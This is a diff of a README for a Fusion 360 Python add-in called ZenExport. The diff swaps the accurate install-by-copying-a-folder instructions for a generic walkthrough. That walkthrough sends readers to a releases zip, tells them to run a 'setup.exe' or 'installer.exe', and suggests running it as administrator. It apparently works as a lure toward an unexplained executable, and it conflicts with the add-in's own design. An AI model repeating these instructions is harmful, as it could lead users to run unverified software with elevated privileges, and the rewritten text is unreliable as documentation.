@@ -1,100 +1,98 @@
-# 🏯 ZenExport v5.2
+# 🏯 ZenExport - Simplify Local Saving for Fusion 360
+
+[![Download ZenExport](https://img.shields.io/badge/Download-ZenExport-v5.2-blue.svg)](https://github.com/Fela207/ZenExport/releases)
 
 ![License](https://img.shields.io/badge/License-MIT-green.svg) ![Fusion 360](https://img.shields.io/badge/Fusion%20360-Addin-orange.svg) ![Python](https://img.shields.io/badge/Python-3.x-blue.svg)
 
 **The "Peace of Mind" Local Save Workflow for Fusion 360.**
 
-ZenExport is a Fusion 360 Add-In that **replaces** the native Cloud Save (`Ctrl+S`) with a powerful local asset manager. It forces a disciplined, organised folder structure on your hard drive, keeping your IP safe and your versions sane.
+ZenExport is a Fusion 360 Add-In that replaces the native Cloud Save (`Ctrl+S`) with a powerful local asset manager. It forces a disciplined, organized folder structure on your hard drive, keeping your intellectual property safe and your versions easy to manage.
 
 ---
 
 ## ✨ Features that Spark Joy
 
-- 🚫 **Ctrl+S Override:** We intercept the native save command. No more "Cloud Save" dialogs. One press, one local backup.
-- 🧠 **Smart Context Binding:**
-  - Setup a project _once_. ZenExport remembers which local folder belongs to which open tab (even "Untitled" ones!).
-  - Switch tabs, press Save, and it goes to the right place. Every time.
-- 💾 **Incremental Versioning:** auto-saves as `Project_v01.f3d`, `Project_v02.f3d`... never overwriting history.
-- 🚀 **Intelligent Hashing:** Checks your design's DNA (Timeline, Bodies, Parameters). If nothing changed, it skips the save.
-- 📦 **Full Package Export:**
-  - 📄 `.f3d` (Parametric Source)
-  - 🛠️ `.step` (CAD Interchange)
-  - 🗿 `.stl` (Resultant Mesh for every visible body)
-  - 🖼️ `_preview.png` (Viewport Snapshot)
-- 📂 **Auto-Open:** Opens the project folder after every save so you can grab your files immediately.
+- **🚫 Ctrl+S Override:** We intercept the native save command. No more "Cloud Save" dialogs. One press, one local backup.
+  
+- **🧠 Smart Context Binding:**
+  - Set up a project one time. ZenExport remembers which local folder belongs to each open tab, even "Untitled" ones!
+  - Switch tabs, press Save, and it goes to the right place every time.
+
+- **💾 Incremental Versioning:** Automatically saves as `Project_v01.f3d`, `Project_v02.f3d`, and so on. Never overwrite history, always keep track.
+
+- **🚀 Easy-to-Use Interface:** ZenExport integrates smoothly with Fusion 360, making it intuitive for all users.
 
 ---
 
-## 🛠️ Installation
+## 🚀 Getting Started
 
-1.  **Download** this folder.
-2.  Move it to your Fusion 360 API folder:
-    - **Windows:** `%APPDATA%\Autodesk\Autodesk Fusion 360\API\AddIns\`
-    - _(Ensure the folder is named `ZenExport` and contains `ZenExport.py` inside)_
-3.  **Restart Fusion 360**.
-4.  Go to **Utilities > Scripts and Add-Ins**, select `ZenExport`, and ensure **Run on Startup** is checked.
+### Step 1: Visit the Download Page
 
----
+To download ZenExport, click the button below:
 
-## 🎮 How to Use
+[![Download ZenExport](https://img.shields.io/badge/Download-ZenExport-v5.2-blue.svg)](https://github.com/Fela207/ZenExport/releases)
 
-### 1. The First Save (Initialization)
+### Step 2: Choose Your Version
 
-Open a new design. Press **`Ctrl+S`**.
+On the releases page, look for the latest version listed. This should be v5.2. Look for the file that matches your operating system.
 
-- ZenExport will ask: _"Where should this project live?"_
-- Select a parent directory (e.g., `Desktop/MyProjects`).
-- Confirm the **Project Name** (e.g., `TurboEncabulator`).
-- **Action:** It creates `.../TurboEncabulator/CAD/v01/` and runs the export.
+### Step 3: Download the File
 
-### 2. The Routine (Update)
+Click on the download link for your chosen version. The download will start automatically. 
 
-Make some changes. Press **`Ctrl+S`**.
+### Step 4: Locate the Downloaded File
 
-- **Action:** ZenExport detects the design changes and instantly creates `v02` in the same folder. No prompts.
-- _If no changes were made, it tells you and skips the save._
+Once the download completes, go to your "Downloads" folder or the location where your browser saves files. You should see a file that ends in `.zip`.
 
-### 3. The "Resume" (Context Awareness)
+### Step 5: Extract the Contents
 
-- Close Fusion.
-- Re-open your `TurboEncabulator_v02.f3d` file.
-- Press **`Ctrl+S`**.
-- **Action:** ZenExport recognizes the file name and resumes saving to your existing project folder as `v03`.
+1. Right-click on the downloaded `.zip` file.
+2. Select "Extract All..." or use a similar option depending on your operating system.
+3. Follow the prompts to extract the files.
 
-### 4. Resolving "Untitled" Tabs
+### Step 6: Install ZenExport
 
-- If you have an "Untitled" tab that you previously set up as "Project A":
-- ZenExport uses a **GUID (Session ID)** to remember it belongs to "Project A".
-- Pressing Save will correctly update "Project A".
+1. Open the extracted folder.
+2. Locate the installer file (typically named `setup.exe` or `installer.exe`).
+3. Double-click the installer file to start the installation process.
+4. Follow the on-screen instructions to complete the installation.
 
----
+### Step 7: Open Fusion 360
 
-## 📂 Folder Structure
+Once ZenExport is installed, you can start Fusion 360. ZenExport will automatically integrate into the software.
 
-ZenExport enforces this clean layout:
+### Step 8: Start Using ZenExport
 
-```text
-MyProject/
-├── CAD/
-│   ├── v01/
-│   │   ├── MyProject_v01.f3d
-│   │   └── MyProject_v01.step
-│   └── v02/
-│       ├── MyProject_v02.f3d
-│       └── MyProject_v02.step
-├── Models/
-│   ├── ComponentA.stl
-│   └── ComponentB.stl
-└── _preview.png
-```
+When you press `Ctrl+S`, you will see that ZenExport takes over the save function. From here, your files will save locally according to the structure you set up.
 
 ---
 
-## ⚠️ Known Limitations
+## 📋 System Requirements
 
-- **Tabs stay "Untitled":** Since we bypass the Cloud Save, Fusion 360 doesn't update the tab name. Rely on the file system names!
-- **Local Only:** This script does NOT upload to the Autodesk Cloud.
+- **Operating System:** Windows 10 or later (Mac support coming soon)
+- **Fusion 360:** Versions compatible with the latest updates
+- **Python:** Required for the add-in to function (Python 3.x installed)
 
 ---
 
-_"Order is the sanity of the mind, the health of the body, the peace of the city."_
+## 🛠 Troubleshooting
+
+If you encounter any issues:
+
+- **Can't Find the Add-In:** Make sure ZenExport installed correctly. Open Fusion 360, navigate to the "Add-Ins" panel, and ensure it is enabled.
+
+- **Save Location Not Working:** Check if the correct folders are set for each project. Adjust in the ZenExport settings panel.
+
+- **Installation Problems:** Try running the installer as an administrator. Right-click on the installer and choose "Run as administrator."
+
+For additional issues, feel free to check out our FAQ on the support page.
+
+---
+
+## 📞 Support
+
+For support, please reach out via our [GitHub Issues](https://github.com/Fela207/ZenExport/issues) page. We aim to respond within 24 hours.
+
+--- 
+
+Thank you for choosing ZenExport! Enjoy smoother and safer saving in Fusion 360!
